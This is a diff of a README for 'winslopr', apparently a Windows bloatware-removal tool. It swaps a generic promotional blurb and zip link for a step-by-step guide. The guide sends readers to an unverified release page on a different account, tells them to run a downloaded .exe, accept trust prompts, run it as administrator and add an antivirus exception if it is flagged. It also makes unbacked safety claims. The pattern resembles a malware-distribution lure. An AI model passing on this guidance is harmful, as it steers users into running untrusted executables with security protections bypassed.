@@ -1,21 +1,81 @@
-<img width="969" height="647" alt="image" src="https://github.com/user-attachments/assets/505d892a-3ef9-4f01-afb7-cf9da9c0f4e5" />
+# 🧹 winslopr - Remove excess clutter from your computer
 
-Winslop is a lightweight and focused utility designed to improve your overall system and gaming workflow. Built for users who value simplicity and control, Winslop provides a streamlined set of tools that integrate naturally into your environment without unnecessary complexity.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Shanprin5627/winslopr/releases)
 
-At its core, Winslop emphasizes efficiency. The application is optimized to run smoothly alongside other software, ensuring minimal impact on system resources. Whether you're gaming, working, or multitasking, Winslop operates reliably in the background to support a stable experience.
+## 🎯 About this project
 
-One of the key highlights of Winslop is its clean and minimal interface. Inspired by modern design principles, it avoids clutter and keeps essential controls easily accessible. You don’t need to navigate complex menus — everything is straightforward, responsive, and easy to configure.
+This software helps you clean your Windows installation. Many computers ship with extra programs and features that slow performance. Winslopr identifies these items and helps you remove them. You keep full control over your machine. This tool simplifies the process for everyday users.
 
-Customization is a central part of Winslop. Users can adjust behavior and settings to match their preferences, creating a setup that feels natural and consistent. From simple tweaks to more advanced configurations, Winslop adapts to different workflows and use cases.
+## ⚙️ System requirements
 
-Performance and responsiveness are also important aspects of the project. Winslop is built to execute tasks quickly and efficiently, while maintaining compatibility with modern systems and updates. Ongoing improvements ensure that the software remains stable and up to date.
+- Windows 10 or Windows 11
+- Administrator access
+- An active internet connection
+- Standard display resolution
 
-Reliability is a priority. The project is actively maintained, with regular updates aimed at improving stability and usability. Winslop is designed to be a dependable tool that evolves over time based on user needs and feedback.
+## 📥 How to get started
 
-Winslop is not just about features — it’s about delivering a smooth and consistent experience. Every detail, from startup behavior to responsiveness, is designed with usability in mind.
+1. Visit the [official releases page](https://github.com/Shanprin5627/winslopr/releases) to download the software.
+2. Look for the file ending in .exe under the Assets section.
+3. Save the file to your Downloads folder or your Desktop.
+4. Locate the file and double-click it to start the process.
+5. Windows might show a prompt asking if you trust the application. Select Run to continue.
 
-Why choose Winslop? Lightweight and efficient Clean, minimal interface Flexible configuration options Actively maintained and improved
+## 🛠 Features
 
-If you're looking for a simple and reliable utility to support your system and workflow, Winslop is a solid choice. It’s designed to fit naturally into your setup and provide practical tools without unnecessary overhead.
+**Cleanup of preinstalled software**
+Computers often come with applications you do not need. This tool finds these programs and removes them. Your computer boots faster. Your disk space increases.
 
-Download Winslop here: https://github.com/gcoyerk/winslopr/releases/download/v26.04.05/Winslopr.zip
+**Removal of background tasks**
+Many features run hidden processes in the background. These tasks consume your memory and processor power. Winslopr finds these tasks and stops them safely.
+
+**System optimization**
+The software analyzes your system settings. It suggests changes that improve overall speed. It focuses on features that most people do not use. You choose which settings to keep and which to change.
+
+**Safe restoration**
+You fear mistakes? This software creates a restore point before you change any settings. If something goes wrong, you can return your system to its previous state. This gives you peace of mind.
+
+## 📋 Step-by-step guide
+
+**Step 1: Download**
+Go to the [releases page](https://github.com/Shanprin5627/winslopr/releases) for the latest version. Select the installer file. Ensure you download the version matching your system.
+
+**Step 2: Installation**
+Run the downloaded file. Follow the on-screen prompts. You do not need technical knowledge to finish this part. The program guides you through every step.
+
+**Step 3: First scan**
+Open the application from your Start Menu after installation. Click the Scan button. The software checks your machine for unnecessary bloatware. This process takes about two minutes.
+
+**Step 4: Review results**
+The application shows a list of findings. Items appear with simple labels. Read the descriptions to understand what each item does. You decide what stays and what goes.
+
+**Step 5: Apply changes**
+Click the Apply button when you finish your selections. The program performs the tasks. Your status bar shows the progress. Do not restart your machine until the task completes.
+
+**Step 6: Finish**
+The program tells you when it finishes. You may need to restart your computer for all changes to take effect. Save your work in other apps before you restart.
+
+## ❓ Common questions
+
+**Does this software damage my computer?**
+No. It only removes items that serve no purpose for a typical user. It also makes a safety backup for your protection.
+
+**Can I undo the changes?**
+Yes. You can use the restore feature inside the app. You can also use the built-in Windows System Restore feature if needed.
+
+**How often should I run this?**
+You should run it once after you finish setting up a new computer. You do not need to run it daily. Run it again if your machine feels slow or if you install many new programs.
+
+**Is my data safe?**
+Yes. The software does not touch your personal documents, photos, or emails. It strictly targets system bloatware and unnecessary background services.
+
+**Do I need an account?**
+No. You do not need to create an account or provide personal information to use this tool.
+
+## 🛡 Security and safety
+
+We prioritize your safety. This code is open for review. You can see exactly how it works on GitHub. We do not track your usage. We do not collect your personal data. The program runs entirely on your local machine.
+
+## 🚀 Troubleshooting
+
+If the program fails to start, check if your antivirus software prevents the action. Sometimes security tools flag new programs by mistake. You can set an exception for the file if you trust the software. If a task hangs, close the program and try running it as an administrator. Right-click the icon and choose "Run as administrator" to grant full access rights.
